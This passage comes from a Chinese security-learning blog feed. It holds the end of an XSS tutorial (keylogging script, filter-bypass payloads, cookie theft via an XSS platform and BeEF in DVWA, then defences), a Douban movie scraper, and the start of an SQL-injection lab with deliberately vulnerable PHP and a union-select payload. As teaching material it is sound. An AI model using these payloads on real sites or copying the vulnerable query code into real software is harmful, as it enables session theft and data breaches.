class="line">try(hijack();)catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>捕获用户输入的特定键</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown()&#123;</span><br><span class="line">var keycode &#x3D; event.keyCode;</span><br><span class="line">var realkey &#x3D; String.fromCharCode(event.keyCode);</span><br><span class="line">alert(&quot;按键码: &quot; + keycode + &quot; 字符: &quot; + realkey);</span><br><span class="line">&#125;</span><br><span class="line">document.onkeydown &#x3D; keyDown;</span><br><span class="line">&lt;&#x2F;scrip&gt;</span><br></pre></td></tr></table></figure><ul><li><code>&lt;&gt;被过滤时</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert&#96;1&#96; </span><br><span class="line">“ autofocus onfocus&#x3D;alert(1)</span><br><span class="line">javascript:alert(111) #输入在 a 标签的 href属性中</span><br></pre></td></tr></table></figure><h1 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h1><p>如果我们的JS水平一般的话（真实），我们可以利用网上免费的XSS平台来构造代码实施攻击。</p><p><a href="https://xss.pt/">经典的XSS平台</a>（也可以下载安装<a href="https://github.com/trysec/BlueLotus_XSSReceiver">清华蓝莲花战队开发的XSS平台</a> ）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317214802204.png" alt="image-20210317214802204"></p><p>在我的项目中创建新项目，选择最基本的默认模块，勾选keepsession，可以完成获取cookie等操作。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215103530.png" alt="image-20210317215103530"></p><p>在出现xss的地方可以插入以下给出的代码，完成攻击。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317215400602.png" alt="image-20210317215400602"></p><p>在DVWA的XSS中进行测试，插入其中一条攻击代码。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222324244.png" alt="image-20210317222324244"></p><p>回到xss平台，已经返回了cookie等信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210317222507374.png" alt="image-20210317222507374"></p><h1 id="BeEF"><a href="#BeEF" class="headerlink" title="BeEF"></a>BeEF</h1><p>BeeF是web框架攻击平台，kali 集成Beef，而且Beef有很多好使的payload。例如，通过XSS这个简单的漏洞，BeeF可以通过一段编制好的javascript控制目标主机的浏览器，通过浏览器拿到各种信息并且扫描内网信息，同时能够配合metasploit进一步渗透主机，强大的有些吓人。</p><p>首先在kali打开BeEF，在左侧栏中点击beef图标会先弹出一个命令行窗口，然后会打开对应网页，命令行窗口显示了一些配置。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318000642015.png" alt="image-20210318000642015"></p><p>利用命令行给出的方法，将脚本代码插入到存在XSS的地方。这里选择插入到DVWA中存储型XSS漏洞的页面。这里的kali就相当于一台服务器。原理与XSS平台类似，就是将受害者的信息发送到kali的beef中。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002439090.png" alt="image-20210318002439090"></p><p>此时BeEF的网页中已经显示自己中招。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210318002610341.png" alt="image-20210318002610341"></p><h1 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210108153631445.png"></p><ul><li><strong>钓鱼欺骗</strong>：最典型的即是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术对目标网站发起更高级的钓鱼攻击。</li><li><strong>网站挂马</strong>：跨站攻击时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上或以弹出恶意网站窗口等的方式，进行挂马。</li><li><strong>身份盗用</strong>：Cookie是用户对于特定网站的身份验证的标志，XSS攻击可以令攻击者盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限</li><li><strong>垃圾信息发送</strong>：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</li><li><strong>劫持用户Web行为</strong>：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等。</li><li><strong>XSS蠕虫病毒</strong>：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、对目标实施DDoS攻击等。</li></ul><p>存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。</p><h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><p>通过对上面内容进行学习，容易知道主要是前端页面完全信任了用户输入的数据导致了XSS漏洞出现，所以我们可以在前端加上过滤代码、转义代码，对用户的输入(和URL参数)进行过滤，输出进行转义。对输入的内容进行过滤，可以分为黑名单过滤和白名单过滤。黑名单：过滤特殊符号及字符，可以拦截大部分的XSS攻击，但是还是存在被绕过的风险。白名单：只允许特定类型或字符，可以基本杜绝XSS攻击，但是真实环境中一般是不能进行如此严格的白名单过滤的。</p><p>其次，假如攻击者有一定几率绕过前端防御，可以将cookie 标记为 http only，这样的话当浏览器向服务端发起请求时就会带上 cookie 字段，但是在脚本中却不能访问 cookie，这样就避免了 XSS 攻击利用 js 的 <code>document.cookie</code>获取 cookie。</p><ul><li>通过一些函数对动态输出到页面的内容进行html编码，使其不能作为脚本运行。如</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用htmlspecialchars函数对用户输入的name参数进行html编码，将其转换为html实体</span><br><span class="line">$name &#x3D; htmlspecialchars( $_GET[ &#39;name&#39; ] );</span><br></pre></td></tr></table></figure><ul><li>使用XSS Filter</li></ul><p>针对用户提交的数据进行有效的验证，只接受我们规定的长度或内容的提交，过滤掉其他的输入内容。比如：</p><ol><li>表单数据指定值的类型：年龄只能是 int 、名字只能是字母数字等。</li><li>过滤或移除特殊的 html 标签：<code>&lt;script&gt;</code>、<code>&lt;iframe&gt;</code>等。</li><li>过滤 js 事件的标签：<code>onclick</code>、<code>onerror</code>、<code>onfocus</code>等。</li></ol><ul><li>确保执行脚本来源可信</li></ul><p>开发者明确告诉客户端，哪些外部资源可以加载和执行（CSP策略）</p><p>总之，总的原则：<strong>输入做过滤，输出做转义</strong></p><ul><li>过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</li><li>转义：所有输出到前端的数据根据输出点进行转义，比如输出到html中进行html实体转义，输入到JS里面进行JS转义。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/qq_35393693/article/details/86597707">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p><p>[2] <a href="https://mp.weixin.qq.com/s?__biz=MzAwNTAxMjUwNw==&mid=2650265496&idx=1&sn=964f788970cb95a8f78dbdc432cff562&chksm=83205aecb457d3faf7f1f9ea017ae0be6139ecd01c03a4d6f097499f0ea0e934cbac2d28eadf&scene=132#wechat_redirect">兵临城下丨记一次XSS靶场通关实践</a></p><p>[3] <a href="https://my.oschina.net/u/4593189/blog/4418296">一篇文章带你从XSS入门到进阶(附Fuzzing+BypassWAF+Payloads)</a></p><p>[4] <a href="https://blog.csdn.net/whoim_i/article/details/102877616">kali之beef的使用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫第一课</title>
      <link href="posts/12051.html"/>
      <url>posts/12051.html</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫初识"><a href="#爬虫初识" class="headerlink" title="爬虫初识"></a>爬虫初识</h1><ul><li>什么是爬虫<br>网络爬虫，是一种按照一定规则，自动抓取互联网信息的程序或者脚本。由于互联网数据的多样性和资源的有限性，根据用户需求定向抓取相关网页并分析已成为如今主流的爬取策略。</li><li>爬虫可以做什么<br>你可以爬取妹子的图片，爬取自己想看的视频等等，只要你能通过浏览器访问的数据都可以通过爬虫获取。</li><li>爬虫的本质是什么<br>模拟浏览器打开网页，获取网页中我们想要的那部分数据。</li></ul><h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><ol><li>准备工作<br>通过浏览器查看分析目标网页。</li><li>获取数据<br>通过requests库向目标站点发起请求，请求可以包含额外的header等信息，如果服务器能正常响应，会得到一个Response，便是所要获取的页面内容。</li><li>解析内容<br>得到的内容可能是HTML、json等格式，可以用页面解析库、正则表达式等进行解析。</li><li>保存数据<br>保存形式多样，可以存为文本，也可以保存到数据库，或者保存特定格式的文件。</li></ol><h1 id="爬虫第一课"><a href="#爬虫第一课" class="headerlink" title="爬虫第一课"></a>爬虫第一课</h1><blockquote><p>这里使用requests模块和BeautifulSoup模块</p><p>爬取内容为：豆瓣top250电影的名字、简介、评分及评分人数。</p></blockquote><h2 id="查找信息"><a href="#查找信息" class="headerlink" title="查找信息"></a>查找信息</h2><p>进入<a href="https://movie.douban.com/top250?start=0">豆瓣电影Top250</a>，F12审查元素，找到所要爬取的信息都在标签 <code>&lt;div class=&quot;info&quot;&gt;</code> 中间，如下图所示。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/4fbThzNRHkCJm2t.png" alt="image-20210314143734029"></p><p><strong>URL：</strong></p><p><a href="https://movie.douban.com/top250?start=0">https://movie.douban.com/top250?start=0</a></p><p>后面分别为：strat=25，50…分别对应前25部、26 ~ 50部、51 ~ 75部…电影的信息。</p><p><strong>User-Agent:</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145348886.png" alt="image-20210314145348886"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_movies</span>():</span></span><br><span class="line">    <span class="comment"># 添加header</span></span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="comment"># 创建存储信息的列表</span></span><br><span class="line">    movie_title=[]</span><br><span class="line">    movie_other=[]</span><br><span class="line">    movie_info=[]</span><br><span class="line">    movie_fen=[]</span><br><span class="line">    movie_num=[]</span><br><span class="line">    <span class="comment"># 遍历每个页面链接并发出GET请求</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        link=<span class="string">&#x27;https://movie.douban.com/top250?start=&#x27;</span>+<span class="built_in">str</span>(i*<span class="number">25</span>)</span><br><span class="line">        r=requests.get(link,headers=headers)</span><br><span class="line">        print(<span class="string">&#x27;已获取第&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">1</span>),<span class="string">&#x27;到&#x27;</span>,<span class="built_in">str</span>(i*<span class="number">25</span>+<span class="number">25</span>),<span class="string">&#x27;部电影信息。&#x27;</span>)</span><br><span class="line">        <span class="comment"># 获取电影信息</span></span><br><span class="line">        soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;title&#x27;</span>).get_text()</span><br><span class="line">            movie_title.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;hd&#x27;</span>):</span><br><span class="line">            name = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;other&#x27;</span>).get_text()</span><br><span class="line">            movie_other.append(name)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;info&#x27;</span>):</span><br><span class="line">            info = t.find(<span class="string">&#x27;p&#x27;</span>).get_text().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            movie_info.append(info)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            fen = t.find(<span class="string">&#x27;span&#x27;</span>, <span class="string">&#x27;rating_num&#x27;</span>).get_text()</span><br><span class="line">            movie_fen.append(fen)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>,<span class="string">&#x27;star&#x27;</span>):</span><br><span class="line">            num = t.find_all(<span class="string">&#x27;span&#x27;</span>)[<span class="number">3</span>].get_text()</span><br><span class="line">            movie_num.append(num)</span><br><span class="line">    <span class="keyword">return</span> movie_title,movie_other,movie_info,movie_fen,movie_num</span><br><span class="line"></span><br><span class="line">a,b,c,d,e=get_movies()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">import</span> codecs</span><br><span class="line">    <span class="comment"># 将获取信息写入TXT文件</span></span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;c:\\Users\\32662\\Desktop\\douban.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&#x27;豆瓣电影 Top 250\n\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>):</span><br><span class="line">                f.write(<span class="string">&#x27;Top&#x27;</span>+<span class="built_in">str</span>(n+<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                f.write(<span class="string">&#x27;电影名：&#x27;</span>+a[n]+b[n]+c[n]+<span class="string">&#x27;豆瓣评分&#x27;</span>+d[n]+<span class="string">&#x27; &#x27;</span>+e[n])</span><br><span class="line">                f.write(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145621481.png" alt="image-20210314145621481"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210314145657377.png" alt="image-20210314145657377"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入环境搭建和代码编写</title>
      <link href="posts/33159.html"/>
      <url>posts/33159.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>测试环境：</p><p>Apache2.4</p><p>php7.4</p><p>MySQL8.0.22</p></blockquote><h1 id="PHP-MySQL"><a href="#PHP-MySQL" class="headerlink" title="PHP + MySQL"></a>PHP + MySQL</h1><p>通过PHP 可以操作MySQL中的数据，但首先需要解决的问题是PHP如何连接到MySQL?</p><p>有以下三种方式：</p><ul><li>MySQLi (面向对象)</li><li>MySQLi (面向过程)</li><li>PDO(PHP Data Objects)</li></ul><p>区别在于：PDO 应用在 12 种不同数据库中， MySQLi 只针对 MySQL 数据库。</p><p>MySQLi 和 PDO在PHP安装时大多数情况下是自动安装的，可能需要做的是在PHP配置文件 <code>php.ini</code>中开启相应模块（去掉前面的分号），安装情况可通过<code>phpinfo()</code>进行查看。</p><p>修改<code>php.ini</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306205054865.png"></p><p>通过<code>phpinfo()</code> 查看</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204317682.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306204242649.png"></p><p><strong>三种连接方式示例：</strong></p><p>MySQLi (面向对象)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>MySQLi (面向过程)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PDO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;username&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$conn</span> = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以下测试代码使用MySQLi (面向过程)进行连接，部分代码参考于sqlilabs源码。</p><h1 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h1><p>回显注入是指我们的查询内容会显示到页面中,造成的原因之一是没有对用户输入的参数进行过滤。</p><p><strong>测试代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQL常规回显注入环境&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;连接MySQL发生错误:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择库 test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消报错显示</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接收参数id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 执行sql语句并返回结果</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your username：&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your password：&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;执行的SQL语句：&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306225550792.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306232323655.png"></p><p><strong>注入语句：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,(select database()),(select version())--+</span><br></pre></td></tr></table></figure><p><strong>注入结果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306224726475.png"></p><p><strong>防御代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对输入的参数进行过滤</span></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p><strong>效果：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307192422989.png" alt="image-20210307192422989"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入是指页面不返回内容数据，无法从回显结果获得信息；但是一般都会保留SQL的报错函数<code>mysqli_error()</code> ；通过<code>extractvalue</code> <code>UpdateXml</code> <code>floor</code>等函数构造错误的语句以从报错信息中获得想要的信息。造成的原因之一也是没有对用户输入的参数进行过滤，导致了用户可以输入非预期的内容从而获得敏感的数据，只不过报错注入是利用错误信息回显。</p><p><strong>测试代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td 